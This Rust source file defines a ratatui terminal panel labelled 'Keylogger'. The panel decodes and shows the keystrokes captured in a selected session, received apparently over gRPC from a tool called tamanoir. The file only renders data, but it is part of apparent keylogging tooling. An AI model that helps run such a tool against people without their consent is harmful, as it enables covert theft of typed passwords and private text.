pub mod utils;

use ratatui::{
    layout::Rect,
    style::{Color, Style, Stylize},
    text::{Span, Text},
    widgets::{Block, BorderType, Paragraph, Wrap},
    Frame,
};
use utils::{format_keys, parse_keycodes, Layout};

use crate::tamanoir_grpc::SessionResponse;

#[derive(Debug)]
pub struct KeyLoggerSection {
    layout: Layout,
}
impl KeyLoggerSection {
    pub fn new() -> Self {
        Self {
            layout: Layout::Azerty,
        }
    }
    pub fn render(
        &mut self,
        frame: &mut Frame,
        block: Rect,
        selected_session: &mut Option<SessionResponse>,
        is_focused: bool,
    ) {
        let txt = match selected_session {
            Some(session) => match parse_keycodes(&session.key_codes, self.layout.clone()) {
                Ok(kc) => Text::from(format_keys(kc)),

                Err(_) => Text::from("Error decoding keycodes".to_string()).centered(),
            },
            _ => Text::from("No Session selected".to_string()).centered(),
        };
        let highlight_color = if is_focused {
            Color::Yellow
        } else {
            Color::Blue
        };
        let p = Paragraph::new(txt).wrap(Wrap { trim: true }).block(
            Block::bordered()
                .border_type(BorderType::Rounded)
                .border_style(Style::new().fg(highlight_color))
                .title(Span::styled(
                    "Keylogger",
                    Style::default().fg(highlight_color).bold(),
                )),
        );

        frame.render_widget(p, block);
    }
}
